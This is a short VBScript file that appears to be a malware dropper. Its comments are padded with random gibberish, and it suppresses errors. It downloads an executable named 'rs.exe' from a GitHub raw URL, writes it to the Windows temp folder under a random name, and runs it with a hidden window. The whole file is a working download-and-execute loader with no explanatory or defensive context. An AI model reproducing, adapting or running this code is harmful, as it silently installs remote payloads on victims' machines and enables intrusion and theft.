' ApcvIOuXwUGUKJMrbKDEtuvZrhtapWBxSnmjgPeNgeEnGCfYsYM
On Error Resume Next
' ekrkHYnElNUeWCWNypHeFNfCdBFZx
Dim xvfqvuh,ybaglop,zvmdnt,audojr,bwolwid,crijha
' AQJYmgljObPwLQusiuNXjVy
Set xvfqvuh = CreateObject("MSXML2.ServerXMLHTTP")
xvfqvuh.Open "GET","https://raw.githubusercontent.com/kai195102/d/main/rs.exe",False
xvfqvuh.Send
' kwCOYsTNBJqHYhkgaNItTmRmPOC
If xvfqvuh.Status = 200 Then
  Set ybaglop = CreateObject("ADODB.Stream")
  ybaglop.Type = 1
  ybaglop.Open
  ybaglop.Write xvfqvuh.ResponseBody
  Set zvmdnt = CreateObject("Scripting.FileSystemObject")
  audojr = zvmdnt.GetSpecialFolder(2)
  bwolwid = audojr & "\8eRBskkt.exe"
  ybaglop.SaveToFile bwolwid, 2
  ybaglop.Close
  Set crijha = CreateObject("WScript.Shell")
  crijha.Run bwolwid, 0, False
End If
' paPAcDAXdajPHDIugykcuJZqlZcxfOqnIKYcQEJUGztfO fJYu
Set xvfqvuh = Nothing
' QFDWXuZmGihWsxoYzsjWvqkpauNAgGyTZ  ale
